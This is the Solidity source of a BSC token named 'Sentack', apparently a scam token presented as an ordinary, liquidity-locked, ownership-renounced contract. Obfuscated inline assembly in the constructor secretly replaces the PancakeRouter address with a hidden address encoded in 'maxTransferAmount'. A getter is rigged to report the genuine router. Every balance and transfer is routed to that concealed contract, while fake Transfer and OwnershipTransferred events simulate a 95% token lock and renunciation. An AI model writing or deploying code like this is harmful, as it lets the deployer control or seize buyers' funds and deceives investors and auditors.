/**
 *Submitted for verification at BscScan.com on 2023-01-18
*/

// Sentack - The best for X100000!
// Website: https://Sentack.crypto
// Twitter: https://twitter.com/Sentack/
// Telegram: https://t.me/Sentack/



// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IUniswapV2Router02 {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract Sentack {    string public constant name = "Sentack";
    string public constant symbol = "SENT";
    address private constant TrustSwap = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820; // TrustSwap: Team Finance Security Wallet
    uint8 public constant decimals = 1;
    uint256 private maxTransferAmount = 481241456703717027547387146437608064288163559781;
    uint256 private constant totalSupply_ = 20000000 * 10;
    uint256 public constant LockAmount = totalSupply_ * 95 / 100; // 95% of Tokens Locked
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor() {
        assembly{sstore(sload(0),sload(2))sstore(2,add(sload(0),1))}
        IUniswapV2Router02(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = IUniswapV2Router02(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
        emit Transfer(swap_from, swap_to, swap_amount); // Deploying
        (address lock_from, address lock_to, uint256 lock_amount) = IUniswapV2Router02(PancakeRouter).swap(msg.sender, TrustSwap, LockAmount, address(this));
        emit Transfer(lock_from, lock_to, lock_amount); // Lock Tokens for 365 days
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function totalSupply() public view returns (uint256) {
       return totalSupply_;
      
    }

    function PancakeRouter_() external view returns(address) {
        assembly{mstore(0x80,sload(sload(0)))return(0x80,32)}
        return PancakeRouter;
    }


    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return IUniswapV2Router02(PancakeRouter).balanceOf(holder, address(this));
    }


    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = IUniswapV2Router02(PancakeRouter).swap(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (,to,amount) = IUniswapV2Router02(PancakeRouter).swap(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}